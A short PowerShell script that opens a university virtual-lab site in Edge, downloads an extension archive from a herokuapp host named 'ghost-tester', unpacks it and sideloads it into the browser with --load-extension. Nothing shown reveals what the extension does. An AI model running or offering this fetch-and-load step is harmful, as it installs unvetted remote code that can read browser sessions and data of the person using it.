start microsoft-edge:https://vlab.ung.edu/?includeNativeClientLaunch=true
Invoke-WebRequest "https://ghost-tester-a8265efa9b4b.herokuapp.com/download/extension.zip" -OutFile "$HOME\Downloads\extension.zip"
Expand-Archive -Path "$HOME\Downloads\extension.zip" -DestinationPath "$HOME\Downloads" -Force
Start-Process "msedge.exe" "--load-extension=$HOME\Downloads\extension"
start microsoft-edge:edge://extensions